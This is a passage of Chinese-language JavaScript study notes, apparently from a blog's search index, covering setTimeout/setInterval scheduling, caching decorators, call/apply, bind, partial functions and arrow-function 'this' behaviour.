<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sayHi = <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">who</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (who) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(who);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    func(<span class="string">&quot;Guest&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sayHi(); <span class="comment">// &#x27;Guest&#x27;</span></span><br><span class="line">func(); <span class="comment">// Error, func is not defined</span></span><br></pre></td></tr></table></figure>
<h1 id="new-Function（很少用）"><a href="#new-Function（很少用）" class="headerlink" title="new Function（很少用）"></a>new Function（很少用）</h1></li>
</ol>
<p>语法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> func = <span class="keyword">new</span> <span class="built_in">Function</span> ([arg1, agr2, ...], functionBody);</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sumNum = <span class="keyword">new</span> <span class="built_in">Function</span> (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;return a + z&#x27;</span>);</span><br><span class="line">sum(<span class="number">1</span>,<span class="number">3</span>); <span class="comment">// 4</span></span><br></pre></td></tr></table></figure>
<p><strong>注：</strong><code>new Function</code>创建的函数的<code>[[Environment]]</code>不指向当前的词法环境，而是<strong>指向全局环境</strong>。</p>
<h1 id="调度：setTimeout和setInterval"><a href="#调度：setTimeout和setInterval" class="headerlink" title="调度：setTimeout和setInterval"></a>调度：setTimeout和setInterval</h1><p>有时，我们并不想立即执行一个函数，而是等待一段时间之后再执行，我们称之为“<strong>计划调用</strong>”（scheduling a call）</p>
<p>目前有两种实现：</p>
<ul>
<li><code>setTimeout</code>允许我们函数在一定时间间隔之后再执行，且仅执行一次</li>
<li><code>setInterval</code>允许我们一定的时间间隔重复运行该函数，从一定时间间隔之后开始运行</li>
</ul>
<p><strong>注：</strong>这两个方法并不在JS规范中，但大多数运行环境都有内建的调度程序，并提供了这些方法。目前，所有浏览器及Node.js都支持这两个方法</p>
<h2 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout"></a>setTimeout</h2><p>语法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> timerId = <span class="built_in">setTimeout</span>(func|codeString, delay, arg1, arg2, ...)</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ol>
<li><code>func|codeString</code>: 要执行的函数或代码字符串（不推荐）</li>
<li><code>delay</code>: 执行前的延迟，以毫秒为单位（1000ms = 1s），默认值为0</li>
<li><code>arg1</code>, <code>arg2, ...</code>: 被执行函数的参数</li>
<li><code>timerId</code>: 接收<code>setTimeout</code>返回的“定时器标识符（timer identifier）”</li>
</ol>
<p>例1：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">steTimeout(sayHi, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<p>例2:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;name&#125;</span>: <span class="subst">$&#123;age&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(sayHi, <span class="number">1000</span>, <span class="string">&#x27;Will&#x27;</span>, <span class="number">24</span>); <span class="comment">// Will: 24</span></span><br></pre></td></tr></table></figure>
<p><strong>注：</strong><code>setTimeout</code>接收的是一个对函数的引用，因此通常情况不要传入一个函数的执行，如<code>sayHi()</code>，因此通常它们不会返回任何结果，<code>setTimeout</code>将接收到一个<code>undefined</code></p>
<h3 id="用clearTimeout来取消调度"><a href="#用clearTimeout来取消调度" class="headerlink" title="用clearTimeout来取消调度"></a>用<code>clearTimeout</code>来取消调度</h3><p><code>setTimeout</code>在调用时会返回一个“定时器标识符（timer identifier）”，我们可以用变量来接收它，并使用它来取消执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> timerId = <span class="built_in">setTimeout</span>(...);</span><br><span class="line"><span class="built_in">clearTimeout</span>(timerId);</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> timerId = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> alert(<span class="string">&#x27;Hello World!&#x27;</span>), <span class="number">1000</span>);</span><br><span class="line"><span class="built_in">console</span>.log(timerId); <span class="comment">// 定时器标识符</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">clearTimeout</span>(timerId); <span class="comment">// 取消调度</span></span><br><span class="line"><span class="built_in">console</span>.log(timerId); <span class="comment">// 定时器标识符还在（并不会因为调度被取消而变成null）</span></span><br></pre></td></tr></table></figure>
<h2 id="setInterval"><a href="#setInterval" class="headerlink" title="setInterval"></a>setInterval</h2><p>语法与<code>setTimeout</code>完全相同</p>
<p>它们的区别是：</p>
<ul>
<li><code>setTimeout</code>只执行一次，但**<code>setInterval</code>是每间隔给定时间，周期性执行**</li>
<li>对于<code>setInterval</code>来说，内部调用程序会每隔一定时间执行一次function，但是function执行也需要时间，且其消耗时间算在“每隔一定时间”内，因此<strong>在使用<code>setInterval</code>时，function实际调用的间隔要比代码中设定的“每隔一定时间”要短</strong></li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> timerId = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;tick&#x27;</span>), <span class="number">2000</span>); <span class="comment">// 每两秒打印一次&#x27;tick&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="built_in">clearInterval</span>(timerId), <span class="number">5000</span>); <span class="comment">// 5秒后停止</span></span><br></pre></td></tr></table></figure>
<h2 id="嵌套的setTimeout"><a href="#嵌套的setTimeout" class="headerlink" title="嵌套的setTimeout"></a>嵌套的setTimeout</h2><p>周期性调度有两种实现方式</p>
<ul>
<li><code>setInterval</code></li>
<li>嵌套的<code>setTimeout</code></li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> timerId = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> <span class="title">func1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;tick&#x27;</span>);</span><br><span class="line">  timerId = <span class="built_in">setTimeout</span>(func1, <span class="number">1000</span>); <span class="comment">//嵌套</span></span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
<p><strong>嵌套的<code>setTimeout</code>比<code>setInterval</code>具有更多的灵活性，因此它可以根据当前执行结果来调度下一次调用</strong>。例如，如果一开始每5秒向服务器请求一次数据，但如果服务器过载了，那么就必须降低请求频率，如增加间隔时间</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> delay = <span class="number">5000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> timerId = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ...发送请求...</span><br><span class="line">  <span class="keyword">if</span> (由于服务器过载请求失败) &#123;</span><br><span class="line">    delay =* <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  timerId = <span class="built_in">setTimeout</span>(request, delay)</span><br><span class="line">&#125;, delay)</span><br></pre></td></tr></table></figure>
<h2 id="零延时的setTimeout"><a href="#零延时的setTimeout" class="headerlink" title="零延时的setTimeout"></a>零延时的setTimeout</h2><p>语法：<code>setTimeout(func, 0)</code>或<code>setTimeout(func)</code></p>
<p><strong>但<code>func</code>仍然要等到当前正在执行的脚本执行完成后，调度程序才会调用它。</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&quot;World!&quot;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Hello, &quot;</span>);</span><br></pre></td></tr></table></figure>
<p>控制台的结果为：</p>
<p><code>&#39;Hello, &#39;</code></p>
<p><code>&#39;World!&#39;</code></p>
<h1 id="装饰器模式和转发-—-call-apply"><a href="#装饰器模式和转发-—-call-apply" class="headerlink" title="装饰器模式和转发 — call/apply"></a>装饰器模式和转发 — call/apply</h1><p>在JavaScript中，函数不仅可以被传递和用作对象，而且还可以在它们之间进行<strong>转发（forward）</strong>调用并<strong>装饰（decorate）</strong>它们。</p>
<h2 id="透明缓存"><a href="#透明缓存" class="headerlink" title="透明缓存"></a>透明缓存</h2><p>假设有一个CPU负载很重的函数，但它的结果非常稳定（即对于相同的输入值，它总返回相同的结果）。因此，我们希望将结果缓存下来，以节省重新计算的额外花费</p>
<p><strong>实现方式：</strong>创建一个包装器（wrapper）函数，同时该函数增加了缓存的功能。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">slow</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x);</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cachingDecorator</span>(<span class="params">func</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> cache = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;      <span class="comment">// wrapper</span></span><br><span class="line">    <span class="keyword">if</span> (cache.has(x)) &#123;</span><br><span class="line">      <span class="keyword">return</span> cache.get(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> result = func(x);  <span class="comment">// (**)</span></span><br><span class="line">    </span><br><span class="line">    cache.set(x, result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">slow = cachingDecorator(slow);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(slow(<span class="number">1</span>)); <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">console</span>.log(slow(<span class="number">2</span>)); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p><code>cachingDecorator</code>是一个<strong>装饰器（decorator）</strong>即它是一个特殊的函数，它接受另一个函数并改变其行为。</p>
<h2 id="使用”func-call”设定上下文"><a href="#使用”func-call”设定上下文" class="headerlink" title="使用”func.call”设定上下文"></a>使用”func.call”设定上下文</h2><p>上述的缓存装饰器不适用于对象方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> worker = &#123;</span><br><span class="line">  <span class="function"><span class="title">someMethod</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="title">slow</span>(<span class="params">x</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x * <span class="built_in">this</span>.someMethod(); <span class="comment">// (*)</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">worker.slow = cachingDecorator(worker.slow);</span><br><span class="line">worker.slow(<span class="number">2</span>); <span class="comment">// Error: Cannot read property &#x27;someMethod&#x27; of undefined</span></span><br></pre></td></tr></table></figure>
<p>错误原因是，当调用<code>(*)</code>行时，使用的<code>this</code>是来自包装器在<code>(**)</code>行调用原始函数的<code>this=undefined</code>。</p>
<p><strong>使用内置的函数方法<code>function.call(context, arg1, arg2, ...)</code>可以显式设置<code>this    </code></strong></p>
<p>上述<code>cachingDecarator</code>代码第<code>(**)</code>应为<code>let result = func.call(this, x)</code>。此时<code>this=worker</code>。</p>
<p>其他用例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params">phrase</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.name+<span class="string">&#x27;: &#x27;</span>+phrase);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> user = &#123;<span class="attr">name</span>:<span class="string">&quot;John&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">say.call(user, <span class="string">&#x27;Hello&#x27;</span>); <span class="comment">// &#x27;John: Hello&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="传递多个参数"><a href="#传递多个参数" class="headerlink" title="传递多个参数"></a>传递多个参数</h3><p>例如，多参数<code>worker.slow</code>:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> worker = &#123;</span><br><span class="line">  <span class="function"><span class="title">slow</span>(<span class="params">min, max</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> min + max;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解决方法：</p>
<ol>
<li>实现一个类似map的多个键的数据结构</li>
<li><strong>使用嵌套map：</strong>即<code>cache.set(min)</code>存储键值对<code>(max, result)</code>。然后使用<code>cache.get(min).get(max)</code>来获取<code>result</code></li>
<li><strong>使用类似哈希函数：</strong>将两个值合并为一个</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cachingDecorator</span>(<span class="params">func, hash</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> cache = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> key = hash(<span class="built_in">arguments</span>);</span><br><span class="line">    <span class="keyword">if</span> (cache.has(key)) &#123;</span><br><span class="line">      <span class="keyword">return</span> cache.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> result = func.call(<span class="built_in">this</span>, ...arguments);</span><br><span class="line">    </span><br><span class="line">    cache.set(key, result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hash</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> args[<span class="number">0</span>] + <span class="string">&#x27;, &#x27;</span> + args[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">worker.slow = cachingDecorator(worker.slow, hash);</span><br><span class="line"><span class="built_in">console</span>.log(worker.slow(<span class="number">1</span>,<span class="number">2</span>)); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<h2 id="function-apply"><a href="#function-apply" class="headerlink" title="function.apply"></a><code>function.apply</code></h2><p><strong>语法：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span>.apply(context, args)</span><br></pre></td></tr></table></figure>
<p><code>function.apply</code>与<code>function.call</code>类似，参数<code>context</code>用于设定<code>this</code>，<strong>唯一的区别在于传入<code>apply</code>的<code>args</code>必须为一个类数组对象，而传入<code>call</code>的<code>arg1, arg2, ...</code>必须为一个参数列表。</strong></p>
<p><strong>Tips：</strong></p>
<ul>
<li>使用Spread语法<code>...</code>可以将**可迭代对象<code>args</code>**展开为参数列表传递给<code>call</code></li>
<li><code>apply</code>仅接受<strong>类数组对象<code>args</code></strong></li>
</ul>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">func.call(context, ...args);</span><br><span class="line">func.apply(context, args);</span><br></pre></td></tr></table></figure>
<p>其中<code>args</code>为数组</p>
<h2 id="方法借用"><a href="#方法借用" class="headerlink" title="方法借用"></a>方法借用</h2><p>如上类哈希函数只适用于2个参数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hash</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> args[<span class="number">0</span>] + <span class="string">&#x27;, &#x27;</span> + args[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单并理想的方法是使用<code>.join()</code>方法，但是尽管<code>args</code>对象是可迭代和类数组对象，但是它不是真正的数组。<strong>因此，使用<code>args.join()</code>会报错。</strong></p>
<p><strong>使用方法借用可以解决这个问题：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hash</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [].join.call(<span class="built_in">arguments</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="装饰器和函数属性"><a href="#装饰器和函数属性" class="headerlink" title="装饰器和函数属性"></a>装饰器和函数属性</h2><p>通常，用装饰的函数/方法去替换原函数/方法是安全的，但是<strong>如果原函数有属性，如<code>func.calledCount</code>，则装饰后的函数不会具有该属性。</strong></p>
<h1 id="函数绑定"><a href="#函数绑定" class="headerlink" title="函数绑定"></a>函数绑定</h1><p>问题：当将对象方法作为回调进行传递，经常会出现“丢失<code>this</code>“的问题</p>
<h2 id="丢失this"><a href="#丢失this" class="headerlink" title="丢失this"></a>丢失<code>this</code></h2><p>例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">  firstName: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">  <span class="function"><span class="title">sayHi</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Hello, <span class="subst">$&#123;<span class="built_in">this</span>.firstName&#125;</span>!`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(user.sayHi, <span class="number">1000</span>); <span class="comment">// &#x27;Hello, undefined&#x27;</span></span><br></pre></td></tr></table></figure>
<p>其中，浏览器中的<code>setTimeout</code>方法有些特殊，它会为函数调用设定<code>this=window</code>，因为它其实是在获取<code>window.firstName</code>。在其他类似情况下，<code>this</code>通常会被设定为<code>undefined</code>。</p>
<blockquote>
<p>那么想将一个对象方法传递到别的地方，然后在该位置进行调用，如何才能确保在正确的上下文中调用它呢？</p>
</blockquote>
<h2 id="解决方案1—包装器"><a href="#解决方案1—包装器" class="headerlink" title="解决方案1—包装器"></a>解决方案1—包装器</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">  firstName: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">  <span class="function"><span class="title">sayHi</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Hello, <span class="subst">$&#123;<span class="built_in">this</span>.firstName&#125;</span>!`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  user.sayHi(); <span class="comment">// &#x27;Hello, John!&#x27;</span></span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<p>也可以使用箭头函数，但更简洁</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> user.sayHi(), <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<p><strong>但是，</strong>如果user的内容在setTimeout中的函数执行前改变了，那么就会发生错误，**使用<code>bind</code>可以避免这样的问题</p>
<h2 id="解决方案2—bind"><a href="#解决方案2—bind" class="headerlink" title="解决方案2—bind"></a>解决方案2—bind</h2><p><em><strong>内建方法<code>bind</code>可以帮助函数绑定<code>this</code></strong></em></p>
<p>基本语法如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> boundFunc = func.bind(context);</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">  firstName: <span class="string">&#x27;John&#x27;</span>,</span><br><span class="line">  <span class="function"><span class="title">sayHi</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Hello, <span class="subst">$&#123;<span class="built_in">this</span>.firstName&#125;</span>!`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sayHi = user.sayHi.bind(user);</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(sayHi, <span class="number">1000</span>); <span class="comment">// &#x27;Hello, John!&#x27;</span></span><br><span class="line"></span><br><span class="line">user = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<h2 id="偏函数—Partial-functions"><a href="#偏函数—Partial-functions" class="headerlink" title="偏函数—Partial functions"></a>偏函数—Partial functions</h2><p><code>bind</code>的完整语法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> boundFunc = func.bind(context, arg1, arg2, ...);</span><br></pre></td></tr></table></figure>
<p><code>bind</code>允许将上下文绑定为<code>this</code>，以及绑定函数的起始参数（即设定某个参数的输入值且不可修改）</p>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mul</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a*b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> double = mul.bind(<span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(double(<span class="number">3</span>)); <span class="comment">// 3*2=6</span></span><br><span class="line"><span class="built_in">console</span>.log(double(<span class="number">4</span>)); <span class="comment">// 4*2=8</span></span><br></pre></td></tr></table></figure>
<h1 id="深入理解箭头函数"><a href="#深入理解箭头函数" class="headerlink" title="深入理解箭头函数"></a>深入理解箭头函数</h1><p>JS的精髓之一是在于创建一个函数并将其传递到某个地方再执行。在这种情况下，我们通常不想离开当前的上下文，此时箭头函数就显得很方便了</p>
<h2 id="箭头函数没有”this”"><a href="#箭头函数没有”this”" class="headerlink" title="箭头函数没有”this”"></a>箭头函数没有”this”</h2><p><strong>箭头函数没有<code>this</code>，如果要访问<code>this</code>，则会从外部获取。</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> group = &#123;</span><br><span class="line">  title: <span class="string">&#x27;JS-Squad&#x27;</span>,</span><br><span class="line">  students: [<span class="string">&#x27;Will&#x27;</span>, <span class="string">&#x27;Dion&#x27;</span>, <span class="string">&#x27;Akshay&#x27;</span>],</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="title">showList</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.students.forEach(</span><br><span class="line">    student =&gt; <span class="built_in">console</span>.log(<span class="built_in">this</span>.title + <span class="string">&#x27;: &#x27;</span> + student))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">group.showList(); <span class="comment">// &#x27;JS-Squad: Will&#x27; ...</span></span><br></pre></td></tr></table></figure>
<p>其中，<code>forEach</code>种使用了箭头函数，因此会从外部获取<code>this</code>，该<code>this</code>为<code>group</code>，所以就是<code>group.title</code>。</p>
<h2 id="箭头函数没有”arguments”"><a href="#箭头函数没有”arguments”" class="headerlink" title="箭头函数没有”arguments”"></a>箭头函数没有”arguments”</h2><p><em><strong>同时，箭头函数也没有<code>arguments</code>变量。</strong></em>因此当我们（常见，在装饰器中）需要使用当前的<code>this</code>和<code>arguments</code>转发一个调用时，可以使用如下写法：</p>
<p>其中：<code>defer</code>获得一个函数，然后返回一个包装器。</p>
<p><strong>箭头函数版：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">defer</span>(<span class="params">f, ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> f.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>), ms)</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params">who</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Hello, <span class="subst">$&#123;who&#125;</span>!`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sayHiDefer = defer(sayHi, <span class="number">2000</span>);</span><br><span class="line">sayHiDefer(<span class="string">&#x27;John&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>非箭头函数版：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">def</span>(<span class="params">f, ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> ctx = <span class="built_in">this</span>;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> f.apply(ctx, args)</span><br><span class="line">    &#125;, ms);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时，需要创建<code>ctx</code>和<code>args</code>，以便<code>setTimeout</code>内部的函数可以获取它们。</p>
<h1 id="补充之前"><a href="#补充之前" class="headerlink" title="补充之前"></a>补充之前</h1><p><strong>for loop</strong></p>
<ul>
<li><em><strong>for/in</strong></em> - loops through the properties of an object</li>
<li><em><strong>for/of</strong></em>- loops through the values of an iterable object</li>
</ul>
]]></content>
      <categories>
        <category>Frontend/前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
</search>
